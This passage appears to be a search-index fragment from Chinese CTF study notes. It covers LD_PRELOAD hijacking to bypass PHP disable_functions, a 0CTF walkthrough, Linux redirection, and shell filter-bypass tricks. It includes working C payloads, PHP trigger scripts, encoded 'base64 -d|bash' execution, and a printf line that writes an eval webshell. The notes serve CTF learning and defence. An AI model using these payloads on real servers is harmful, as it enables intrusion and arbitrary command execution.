<p>\u5bf9\u4e8e\u52a8\u6001\u94fe\u63a5\u6765\u8bf4\uff0c\u9700\u8981\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u5176\u4f5c\u7528\u5728\u4e8e\u5f53\u52a8\u6001\u5e93\u4e2d\u7684\u51fd\u6570\u53d1\u751f\u53d8\u5316\u5bf9\u4e8e\u53ef\u6267\u884c\u7a0b\u5e8f\u6765\u8bf4\u65f6\u900f\u660e\u7684\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f\u65e0\u9700\u91cd\u65b0\u7f16\u8bd1\uff0c\u65b9\u4fbf\u7a0b\u5e8f\u7684\u53d1\u5e03/\u7ef4\u62a4/\u66f4\u65b0\u3002\u4f46\u662f\u7531\u4e8e\u7a0b\u5e8f\u662f\u5728\u8fd0\u884c\u65f6\u52a8\u6001\u52a0\u8f7d\uff0c\u8fd9\u5c31\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u5047\u5982\u7a0b\u5e8f\u52a8\u6001\u52a0\u8f7d\u7684\u51fd\u6570\u662f\u6076\u610f\u7684\uff0c\u5c31\u6709\u53ef\u80fd\u5bfc\u81f4disable_function\u88ab\u7ed5\u8fc7\u3002(\u8fd9\u91cc\u7684disable_function\u5c31\u662f\u7cfb\u7edf\u6240\u8fc7\u6ee4\u7684\u51fd\u6570\u3002)</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#ld_preload_1","title":"LD_PRELOAD\u4ecb\u7ecd","text":"<p>\u5728UNIX\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e16\u754c\u4e2d\uff0cLD_PRELOAD\u5c31\u662f\u8fd9\u6837\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u5b83\u53ef\u4ee5\u5f71\u54cd\u7a0b\u5e8f\u7684\u8fd0\u884c\u65f6\u7684\u94fe\u63a5\uff08Runtimelinker\uff09\uff0c\u5b83\u5141\u8bb8\u4f60\u5b9a\u4e49\u5728\u7a0b\u5e8f\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u3002\u8fd9\u4e2a\u529f\u80fd\u4e3b\u8981\u5c31\u662f\u7528\u6765\u6709\u9009\u62e9\u6027\u7684\u8f7d\u5165\u4e0d\u540c\u52a8\u6001\u94fe\u63a5\u5e93\u4e2d\u7684\u76f8\u540c\u51fd\u6570\u3002\u901a\u8fc7\u8fd9\u4e2a\u73af\u5883\u53d8\u91cf\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u4e3b\u7a0b\u5e8f\u548c\u5176\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u4e2d\u95f4\u52a0\u8f7d\u522b\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u751a\u81f3\u8986\u76d6\u6b63\u5e38\u7684\u51fd\u6570\u5e93\u3002\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u529f\u80fd\u6765\u4f7f\u7528\u81ea\u5df1\u7684\u6216\u662f\u66f4\u597d\u7684\u51fd\u6570\uff08\u65e0\u9700\u522b\u4eba\u7684\u6e90\u7801\uff09\uff0c\u800c\u53e6\u4e00\u65b9\u9762\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4ee5\u5411\u522b\u4eba\u7684\u7a0b\u5e8f\u6ce8\u5165\u6076\u610f\u7a0b\u5e8f\uff0c\u4ece\u800c\u8fbe\u5230\u90a3\u4e0d\u53ef\u544a\u4eba\u7684\u7f6a\u6076\u7684\u76ee\u7684\u3002</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_3","title":"\u6f0f\u6d1e\u5229\u7528","text":"<p>\u60f3\u8981\u5229\u7528LD_PRELOAD\u73af\u5883\u53d8\u91cf\u7ed5\u8fc7disable_functions\u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u51e0\u70b9</p> <pre><code>\u80fd\u591f\u4e0a\u4f20\u81ea\u5df1\u7684.so\u6587\u4ef6\n\n\u80fd\u591f\u63a7\u5236\u73af\u5883\u53d8\u91cf\u7684\u503c\uff08\u8bbe\u7f6eLD_PRELOAD\u53d8\u91cf\uff09\uff0c\u6bd4\u5982putenv\u51fd\u6570\n\n\u5b58\u5728\u53ef\u4ee5\u63a7\u5236PHP\u542f\u52a8\u5916\u90e8\u7a0b\u5e8f\u7684\u51fd\u6570\u5e76\u80fd\u6267\u884c\uff08\u56e0\u4e3a\u65b0\u8fdb\u7a0b\u542f\u52a8\u5c06\u52a0\u8f7dLD_PRELOAD\u4e2d\u7684.so\u6587\u4ef6\uff09\uff0c\u6bd4\u5982mail()\u3001imap_mail()\u3001mb_send_mail()\u548cerror_log()\u7b49\nPlain Text\n</code></pre>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#_4","title":"\u6d41\u7a0b","text":"<p>\u4e0b\u9762\u662f\u5177\u4f53\u6f0f\u6d1e\u6267\u884c\u7684\u6d41\u7a0b\uff1a</p> <ol> <li> <p>\u9996\u5148\uff0c\u6211\u4eec\u80fd\u591f\u4e0a\u4f20\u6076\u610f<code>.so</code>\u6587\u4ef6\uff0c<code>.so\u6587\u4ef6</code>\u7531\u653b\u51fb\u8005\u5728\u672c\u5730\u4f7f\u7528\u4e0e\u670d\u52a1\u7aef\u76f8\u8fd1\u7684\u7cfb\u7edf\u73af\u5883\u8fdb\u884c\u7f16\u8bd1\uff0c\u8be5\u5e93\u4e2d\u91cd\u5199\u4e86\u76f8\u5173\u7cfb\u7edf\u51fd\u6570\uff0c\u91cd\u5199\u7684\u7cfb\u7edf\u51fd\u6570\u80fd\u591f\u88abPHP\u4e2d\u672a\u88abdisable_functions\u7981\u6b62\u7684\u51fd\u6570\u6240\u8c03\u7528\u3002\u8fd9\u4e00\u73af\u8282\u6709\u70b9\u50cf\u6c47\u7f16\u91cc\u9762\u7684link\u64cd\u4f5c\u5c06\u4e0a\u4f20\u7684.so\u52a8\u6001\u94fe\u63a5\u5e93\u3002\uff08\u76f8\u5f53\u4e8e\u4e00\u6bb5\u6c47\u7f16\u4ee3\u7801\u94fe\u63a5\u4e0a\u4ed6\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff09</p> </li> <li> <p>\u5f53\u6211\u4eec\u80fd\u591f\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u6bd4\u5982putenv\u51fd\u6570\u672a\u88ab\u7981\u6b62\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u628aLD_PRELOAD\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u6076\u610f.so\u6587\u4ef6\u7684\u8def\u5f84\uff0c\u53ea\u8981\u542f\u52a8\u65b0\u7684\u8fdb\u7a0b\u5c31\u4f1a\u5728\u65b0\u8fdb\u7a0b\u8fd0\u884c\u524d\u4f18\u5148\u52a0\u8f7d\u8be5\u6076\u610f.so\u6587\u4ef6\uff0c\u7531\u6b64\uff0c\u6076\u610f\u4ee3\u7801\u5c31\u88ab\u6ce8\u5165\u5230\u7a0b\u5e8f\u4e2d\u3002</p> </li> </ol> <p>\u4e0b\u9762\u7a0d\u5fae\u6ce8\u91ca\u4e00\u4e0b\uff1a\u8fd9\u91cc\u7684putenv\u51fd\u6570\uff1a</p> <p></p> <p></p> <p>\u589e\u52a0\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u3002</p> <p>\u5f53\u6267\u884c\u672a\u88ab\u7981\u6b62\u7684PHP\u51fd\u6570\uff0c\u5e76\u4e14\u8be5\u51fd\u6570\u8c03\u7528\u4e86\u6076\u610f\u5e93\u4e2d\u91cd\u5199\u7684\u7cfb\u7edf\u51fd\u6570\uff0c\u5c31\u53ef\u4ee5\u8fbe\u5230\u4efb\u610f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u6548\u679c\u4e86\uff0c\u56e0\u4e3a\u91cd\u5199\u7684\u7cfb\u7edf\u51fd\u6570\u4e2d\u7684\u5185\u5bb9\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u5bf9\u8fd9\u90e8\u5206\u5185\u5bb9\u8fdb\u884c\u7f16\u7a0b\u5373\u53ef\u3002</p> <p>PHP\u4e2d\u67d0\u4e9b\u51fd\u6570\u6bd4\u5982mail()\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u7cfb\u7edf\u4e2d\u7684sendmail\u51fd\u6570\uff0c\u7531\u4e8eLD_PRELOAD\u4e2d\u6307\u5b9a\u52a0\u8f7d\u4e86\u6076\u610f\u7684.so\u6587\u4ef6\u4e2d\u8986\u76d6\u4e86sendmail\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u4f1a\u6267\u884c\u91cd\u5199\u7684sendmail\u51fd\u6570\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u7ed5\u8fc7disable_functions\uff0c\u8fbe\u5230\u4efb\u610f\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u7684\u6548\u679c\u3002</p> <p></p> <p>\u4e3e\u4e2a\u4f8b\u5b50</p> <p></p> <p>\u9996\u5148\u67e5\u770bsendmail\u8fd9\u4e00\u7cfb\u7edf\u51fd\u6570\u4f1a\u8c03\u7528\u54ea\u4e9b\u5e93\u51fd\u6570</p> <p>readelf -Ws /usr/sbin/sendmail</p> <p>\u4ece\u8fd9\u4e9b\u5e93\u51fd\u6570\u4e2d\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u5373\u53ef\uff0c\u8fd9\u91cc\u9009\u53d6seteuid()\u6765\u8fdb\u884c\u91cd\u5199</p> <p></p> <p>\u91cd\u5199\u7684\u51fd\u6570\uff1a</p> <pre><code>   #include &lt;stdlib.h&gt;\n   #include &lt;stdio.h&gt;\n   #include &lt;string.h&gt;\n\n\n    void payload() {\n           system(\"touch /var/www/html/success\");\n    }\n\n\n   int  seteuid() {\n       if (getenv(\"LD_PRELOAD\") == NULL) { return 0; }\n       unsetenv(\"LD_PRELOAD\");\n       payload();\n    }\nPlain Text\n</code></pre> <p>\uff08\u5982\u679c\u60f3\u521b\u5efa\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u5e93\uff0c\u53ef\u4ee5\u4f7f\u7528 GCC \u7684-shared\u9009\u9879\u3002\u8f93\u5165\u6587\u4ef6\u53ef\u4ee5\u662f\u6e90\u6587\u4ef6\u3001\u6c47\u7f16\u6587\u4ef6\u6216\u8005\u76ee\u6807\u6587\u4ef6\u3002\u53e6\u5916\u8fd8\u5f97\u7ed3\u5408-fPIC\u9009\u9879\u3002-fPIC \u9009\u9879\u4f5c\u7528\u4e8e\u7f16\u8bd1\u9636\u6bb5\uff0c\u544a\u8bc9\u7f16\u8bd1\u5668\u4ea7\u751f\u4e0e\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\uff08Position-Independent Code\uff09\uff1b\u8fd9\u6837\u4e00\u6765\uff0c\u4ea7\u751f\u7684\u4ee3\u7801\u4e2d\u5c31\u6ca1\u6709\u7edd\u5bf9\u5730\u5740\u4e86\uff0c\u5168\u90e8\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff0c\u6240\u4ee5\u4ee3\u7801\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5668\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u4efb\u610f\u4f4d\u7f6e\uff0c\u90fd\u53ef\u4ee5\u6b63\u786e\u7684\u6267\u884c\u3002\u8fd9\u6b63\u662f\u5171\u4eab\u5e93\u6240\u8981\u6c42\u7684\uff0c\u5171\u4eab\u5e93\u88ab\u52a0\u8f7d\u65f6\uff0c\u5728\u5185\u5b58\u7684\u4f4d\u7f6e\u4e0d\u662f\u56fa\u5b9a\u7684\u3002\u4f60\u8981\u6839\u636e\u76ee\u6807\u67b6\u6784\u7f16\u8bd1\u6210\u4e0d\u540c\u7248\u672c\uff0c\u5728 x64 \u7684\u73af\u5883\u4e2d\u7f16\u8bd1\uff0c\u82e5\u4e0d\u5e26\u7f16\u8bd1\u9009\u9879\u5219\u9ed8\u8ba4\u4e3a x64\uff0c\u82e5\u8981\u7f16\u8bd1\u6210 x86 \u67b6\u6784\u9700\u8981\u52a0\u4e0a -m32 \u9009\u9879\u3002)</p> <p>\u4e0a\u4f20.so\u6587\u4ef6</p> <p>\u5199\u5165webshell</p> <pre><code>test2.php   &lt;?php\n   putenv(\"LD_PRELOAD=/var/www/hack.so\");\n   mail(\"[emailprotected]\",\"\",\"\",\"\",\"\");\n?&gt;\n\u8fd9\u91cc\u662f\u76f8\u5f53\u4e8e\u5411\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u5199\u5165\u8be5.so\u6587\u4ef6\u7684\u8def\u5f84\nPlain Text\n</code></pre> <p>\u56de\u5230LD_PRELOAD \u672c\u8eab\uff0c\u7cfb\u7edf\u901a\u8fc7\u5b83\u9884\u5148\u52a0\u8f7d\u5171\u4eab\u5bf9\u8c61\uff0c\u5982\u679c\u80fd\u627e\u5230\u4e00\u4e2a\u65b9\u5f0f\uff0c\u5728\u52a0\u8f7d\u65f6\u5c31\u6267\u884c\u4ee3\u7801\uff0c\u800c\u4e0d\u7528\u8003\u8651\u52ab\u6301\u67d0\u4e00\u7cfb\u7edf\u51fd\u6570\uff0c\u6bd4\u5982geteuid\uff08\uff09\u3002</p> <p>\u5728GCC \u6709\u4e2a C \u8bed\u8a00\u6269\u5c55\u4fee\u9970\u7b26 attribute((constructor))\uff0c\u53ef\u4ee5\u8ba9\u7531\u5b83\u4fee\u9970\u7684\u51fd\u6570\u5728main() \u4e4b\u524d\u6267\u884c\uff0c\u82e5\u5b83\u51fa\u73b0\u5728\u5171\u4eab\u5bf9\u8c61\u4e2d\u65f6\uff0c\u90a3\u4e48\u4e00\u65e6\u5171\u4eab\u5bf9\u8c61\u88ab\u7cfb\u7edf\u52a0\u8f7d\uff0c\u7acb\u5373\u5c06\u6267\u884c__attribute__((constructor))\u4fee\u9970\u7684\u51fd\u6570\u3002</p> <p>attribute((constructor))</p> <p>constructor\u53c2\u6570\u8ba9\u7cfb\u7edf\u6267\u884cmain()\u51fd\u6570\u4e4b\u524d\u8c03\u7528\u51fd\u6570(\u88ab__attribute__((constructor))\u4fee\u9970\u7684\u51fd\u6570)</p> <p>attribute((destructor))</p> <p>destructor\u53c2\u6570\u8ba9\u7cfb\u7edf\u5728main()\u51fd\u6570\u9000\u51fa\u6216\u8005\u8c03\u7528\u4e86exit()\u4e4b\u540e,(\u88ab__attribute__((destructor))\u4fee\u9970\u7684\u51fd\u6570)</p> <p>\u56e0\u6b64\uff0c\u53ea\u8981php\u4e2d\u8bbe\u7f6e\u4e86LD_PRELOAD\uff0c\u5e76\u6d3e\u751f\u4e86\u65b0\u7684\u8fdb\u7a0b\uff0c\u5c06\u4f1a\u6267\u884cLD_PRELOAD\u7684\u6587\u4ef6\u4e2d__attribute__((constructor))\u91cc\u7684\u51fd\u6570(\u8fd9\u4e2a\u662f\u8fd9\u91cc\u7684\u539f\u7406\uff0c\u4e0e\u51fd\u6570\u8c03\u7528\u52a0\u8f7d\u7684\u8fc7\u7a0b\u6709\u5173\uff0c\u5e94\u8be5\u80fd\u770b\u61c2)</p> <pre><code>test3.c\n\n   #include &lt;stdlib.h&gt;\n   #include &lt;string.h&gt;\n   __attribute__((constructor))void payload() {\n       unsetenv(\"LD_PRELOAD\");\n       const char* cmd = getenv(\"CMD\");\n       system(cmd);\n    }\n\ntest2.php\n\n   &lt;?php\n   putenv(\"CMD=ls\");\n   putenv(\"LD_PRELOAD=./test3_x64.so\");\n   error_log(\"a\",1);\n   ?&gt;\nPlain Text\n</code></pre> <p>\u7136\u540e\u8c03\u7528\u4fee\u6539\u540e\u7684\u51fd\u6570\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"web/linux/LD_PRELOAD%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81/#2019-0ctftctf-wallbreaker-easy","title":"2019 0CTF/TCTF wallbreaker easy","text":"<p>\u9898\u76ee\u7406\u89e3\uff1a\u8fd9\u91cc\u7ed9\u4e86\u4f60\u6728\u9a6c\uff0c\u53ef\u4ee5\u5f88\u5feb\u7684\u8fde\u63a5\u4e0a\u5b83\u7684\u670d\u52a1\u5668\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u6743\u9650\u4e0d\u591f\uff0c\u4f60\u53ea\u80fd\u8bbf\u95ee/var/www/html\u548c/tmp/sajdhashdoahodsaodhsahjdh(\u5c31\u662f\u5f88\u957f)\u800c\u4e14\u80fd\u591f\u5728\u540e\u9762\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u3002</p> <p>\u90a3\u4e48\u5173\u952e\u5c31\u5728\u8fd9\u91cc\u7684\u6587\u4ef6\u4e0a\u4f20\uff0c\u6211\u4e48\u53ef\u4ee5\u5728\u7ec8\u7aef\u4e0a\u4e0a\u4f20.so\u6587\u4ef6\uff0c\u8fd9\u4e2aso\u6587\u4ef6\u4fee\u6539\u51fd\u6570\u7684\u5185\u5bb9\u5219\u662f\u5728\u4ee3\u7801\u5ba1\u8ba1\u4e2d\u6240\u63d0\u5230\u7684ImageMagick\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u4f1a\u8fde\u63a5\u5230\u5916\u9762\u7684\u52a8\u6001\u5e93\uff0c\u7136\u540e\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u5229\u7528putenv\u51fd\u6570\u5c06\u6211\u4eec\u4fee\u6539\u7684\u5305\u542b\u5728ImageMagick\u4e2d\u7684\u51fd\u6570\u653e\u5230\u73af\u5883\u53d8\u91cf\u4e4b\u4e2d\uff0c\u7136\u540e\u6211\u4eec\u63d0\u4ea4\u968f\u610f\u4e00\u5f20\u56fe\u7247\uff0c\u8ba9\u7a0b\u5e8f\u81ea\u52a8\u8c03\u7528ImageMagic\uff0c\u7136\u540e\u53c8\u4f1a\u7531\u4e8eLD_preload\u5c06\u90a3\u4e2a\u67d0\u4e2a\u51fd\u6570\u66ff\u6362\u6210\u6211\u4eec\u5148\u524d\u4fee\u6539\u7684\u540c\u540d\u51fd\u6570\uff0c\u4ece\u800c\u8fbe\u5230\u7ed5\u8fc7destruct_function.</p> <pre><code>$a=new Imagick();$a-&gt;readImage('123.png');$a-&gt;writeImage('sad.wdp');  //\u89e6\u53d1\u65b0\u8fdb\u7a0b\nPlain Text\n</code></pre> <p>\u7f16\u8bd1\u6210.so\u6587\u4ef6\u540e\u4e0a\u4f20</p> <p>\u7136\u540e\u518d\u4e0a\u4f20\u4e00\u5f20\u56fe\u7247\uff0c\u4e4b\u540e\u7531\u4e8e\u81ea\u52a8\u8c03\u7528\uff0c\u5b8c\u6210\u4ee3\u7801\u6267\u884c</p> <p>\u81f3\u4e8e\u4e0d\u9700\u8981\u6280\u5de7\u7684\u64cd\u4f5c\uff1a</p> <p>\u8681\u5251\u4e0a\u6709\u7ed5\u8fc7destruct_function\u7684\u63d2\u4ef6</p> <p>\u539f\u7406\u5728\u5b98\u7f51\u4e0a\u548c\u8fd9\u4e2a\u662f\u4e00\u6837\u7684,\u90fd\u662fld_preload\u51fd\u6570\u52ab\u6301\u3002</p> <p>\u4e0b\u8f7d\u63d2\u4ef6\u6253\u5f00\u5373\u53ef\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p>"},{"location":"web/linux/linux%E7%AE%A1%E9%81%93%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/","title":"linux\u7ba1\u9053\u7b26\u4e0e\u91cd\u5b9a\u5411","text":"<p>\u7ba1\u9053\u7b26\u5728\u6bd4\u8d5b\u4e2d\u5176\u5b9e\u8fc7\u6ee4\u7684\u6bd4\u8f83\u591a\uff0c\u4f46\u662f\u6ca1\u6709\u8fc7\u6ee4\u6389\u7684\u7ba1\u9053\u7b26\u5f80\u5f80\u5374\u53c8\u662f\u8003\u5bdf\u70b9</p> <p>\u4ee5\u4e0b\u5185\u5bb9\u5168\u90e8\u90fd\u4e0d\u662f\u539f\u521b</p> <p>1\uff0c\u591a\u547d\u4ee4\u6267\u884c\u7b26\u2019</p> <p></p> <p>\u4f8b\uff1als;date;pwd \u4f1a\u6309\u7167\u987a\u5e8f\u4f9d\u6b21\u6267\u884c</p> <p>ls &amp;&amp; echo yes || echo no</p> <p>ls\u547d\u4ee4\u6267\u884c\u6b63\u786e\u6253\u5370yes\u6267\u884c\u9519\u8bef\u6253\u5370no</p> <p>Linux\u4e4b\u7ba1\u9053\u7b26</p> <p></p> <p>\u4f8b\uff1aps aux | grep nginx</p> <p>\u547d\u4ee41: \uff08ps aux\uff09ps\u547d\u4ee4\u5c31\u662f\u6700\u57fa\u672c\u8fdb\u7a0b\u67e5\u770b\u547d\u4ee4\uff0c-a \uff1a \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u8fdb\u7a0b\uff0c\u5305\u62ec\u5176\u4ed6\u7528\u6237\u7684\u8fdb\u7a0b\uff1b</p> <p>-u \uff1a\u4ee5\u7528\u6237\u4e3a\u4e3b\u7684\u8fdb\u7a0b\u72b6\u6001 \uff1bx \uff1a\u901a\u5e38\u4e0e a \u8fd9\u4e2a\u53c2\u6570\u4e00\u8d77\u4f7f\u7528\uff0c\u53ef\u5217\u51fa\u8f83\u5b8c\u6574\u4fe1\u606f\u3002</p> <p>\u547d\u4ee42\uff1a\uff08grep nginx\uff09\u4eceps aux\u6267\u884c\u7ed3\u679c\u4e2d\u5bfb\u627e\u542b\u6709nginx\u7684\u884c</p> <p>linux\u91cd\u5b9a\u5411</p> <pre><code>1.1      \u91cd\u5b9a\u5411\u7b26\u53f7\n&gt;               \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6\n&gt;!              \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u5f3a\u5236\u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6\n&gt;&gt;             \u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8ffd\u52a0\u539f\u6765\u7684\u6587\u4ef6\n&lt;               \u8f93\u5165\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u7a0b\u5e8f \n1.2\u6807\u51c6\u9519\u8bef\u91cd\u5b9a\u5411\u7b26\u53f7\n2&gt;             \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6  b-shell\n2&gt;&gt;           \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8ffd\u52a0\u5230\u539f\u6765\u7684\u6587\u4ef6\n2&gt;&amp;1         \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa \u6ce8\u91ca:1 \u53ef\u80fd\u5c31\u662f\u4ee3\u8868 \u6807\u51c6\u8f93\u51fa\n&gt;&amp;             \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u6587\u4ef6\u6216\u8bbe\u5907 \u8986\u76d6\u539f\u6765\u7684\u6587\u4ef6  c-shell\n|&amp;              \u5c06\u4e00\u4e2a\u6807\u51c6\u9519\u8bef \u7ba1\u9053 \u8f93\u9001 \u5230\u53e6\u4e00\u4e2a\u547d\u4ee4\u4f5c\u4e3a\u8f93\u5165\n1.3\u547d\u4ee4\u91cd\u5bfc\u5411\u793a\u4f8b\n\u5728 bash \u547d\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e3b\u8981\u6709\u4e09\u79cd\u8f93\u51fa\u5165\u7684\u72b6\u51b5\uff0c\u5206\u522b\u662f\uff1a\n1. \u6807\u51c6\u8f93\u5165\uff1b\u4ee3\u7801\u4e3a 0 \uff1b\u6216\u79f0\u4e3a stdin \uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a &lt;\n2. \u6807\u51c6\u8f93\u51fa\uff1a\u4ee3\u7801\u4e3a 1 \uff1b\u6216\u79f0\u4e3a stdout\uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a 1&gt;\n3. \u9519\u8bef\u8f93\u51fa\uff1a\u4ee3\u7801\u4e3a 2 \uff1b\u6216\u79f0\u4e3a stderr\uff1b\u4f7f\u7528\u7684\u65b9\u5f0f\u4e3a 2&gt;\n[test @test test]# ls -al &gt; list.txt\n\u5c06\u663e\u793a\u7684\u7ed3\u679c\u8f93\u51fa\u5230 list.txt \u6587\u4ef6\u4e2d\uff0c\u82e5\u8be5\u6587\u4ef6\u4ee5\u5b58\u5728\u5219\u4e88\u4ee5\u53d6\u4ee3\uff01\n[test @test test]# ls -al &gt;&gt; list.txt\n\u5c06\u663e\u793a\u7684\u7ed3\u679c\u7d2f\u52a0\u5230 list.txt \u6587\u4ef6\u4e2d\uff0c\u8be5\u6587\u4ef6\u4e3a\u7d2f\u52a0\u7684\uff0c\u65e7\u6570\u636e\u4fdd\u7559\uff01\n[test @test test]# ls -al  1&gt; list.txt   2&gt; list.err\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u6b63\u786e\u7684\u8f93\u51fa\u5230 list.txt \u9519\u8bef\u7684\u6570\u636e\u8f93\u51fa\u5230 list.err\n[test @test test]# ls -al 1&gt; list.txt 2&gt; &amp;1\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u4e0d\u8bba\u6b63\u786e\u6216\u9519\u8bef\u5747\u8f93\u51fa\u5230 list.txt \u5f53\u4e2d\uff01\u9519\u8bef\u4e0e\u6b63\u786e\u6587\u4ef6\u8f93\u51fa\u5230\u540c\u4e00\u4e2a\u6587\u4ef6\u4e2d\uff0c\u5219\u5fc5\u987b\u4ee5\u4e0a\u9762\u7684\u65b9\u6cd5\u6765\u5199\uff01\u4e0d\u80fd\u5199\u6210\u5176\u5b83\u683c\u5f0f\uff01[test @test test]# ls -al 1&gt; list.txt 2&gt; /dev/null\n\u5c06\u663e\u793a\u7684\u6570\u636e\uff0c\u6b63\u786e\u7684\u8f93\u51fa\u5230 list.txt \u9519\u8bef\u7684\u6570\u636e\u5219\u4e88\u4ee5\u4e22\u5f03\uff01 /dev/null \uff0c\u53ef\u4ee5\u8bf4\u6210\u662f\u9ed1\u6d1e\u88c5\u7f6e\u3002\u4e3a\u7a7a\uff0c\u5373\u4e0d\u4fdd\u5b58\u3002\nPlain Text\n</code></pre> <p>\u5176\u5b9e\u4e5f\u633a\u597d\u8bb0\u7684,\u5c31\u50cf\u4e00\u4e2a\u7bad\u5934\u4e00\u6837</p> <p>\u8fd8\u53ef\u4ee5\u7528\u7ba1\u9053\u7b26\u6765\u521b\u5efa\u6587\u4ef6echo xxx &gt;1.txt</p>"},{"location":"web/linux/linux%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","title":"linux\u7ed5\u8fc7\u59ff\u52bf","text":"<p>\u62fc\u63a5\u7ed5\u8fc7</p> <pre><code>#\u6267\u884cls\u547d\u4ee4\uff1a\na=l;b=s;$a$b\n#cat flag\u6587\u4ef6\u5185\u5bb9\uff1a\na=c;b=at;c=f;d=lag;$a$b${c}${d}\n#cat test\u6587\u4ef6\u5185\u5bb9\na=\"ccaatt\";b=${a:0:1}${a:2:1}${a:4:1};$btest\nPlain Text\n</code></pre> <p>\u7f16\u7801\u7ed5\u8fc7</p> <pre><code>#base64\necho \"Y2F0IC9mbGFn\"|base64 -d|bash ==&gt;cat /flag\necho Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag\n#hex\necho \"0x636174202f666c6167\" | xxd -r -p|bash ==&gt;cat /flag\n#oct/\u5b57\u8282\n$(printf \"\\154\\163\") ==&gt;ls\n$(printf \"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\") ==&gt;cat /flag\n{printf,\"\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\"}|\\$0 ==&gt;cat /flag\n\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u5199\u9a6c\n\u5185\u5bb9\u4e3aphp @eval($_POST['c']);?&gt;\n${printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"} &gt;&gt; 1.php\u3002\n\nPlain Text\n</code></pre> <p>\u6b63\u5219\u5339\u914d</p> <pre><code>cat t?st\ncat te*\ncat t[a-z]st\ncat t{a,b,c,d,e,f}st\nPlain Text\n</code></pre> <p>\u5f02\u6216\u7ed5\u8fc7\uff08linux\u53ef\u4ee5\u8fd9\u4e48\u7528\uff0c\u4f46\u8fd9\u91cc\u5e94\u8be5\u4e0d\u662flinux\uff09</p> <pre><code>var_dump('#'^'|'); //\u5f97\u5230\u5b57\u7b26 _\nvar_dump('.'^'~'); //\u5f97\u5230\u5b57\u7b26 P\nvar_dump('/'^'`'); 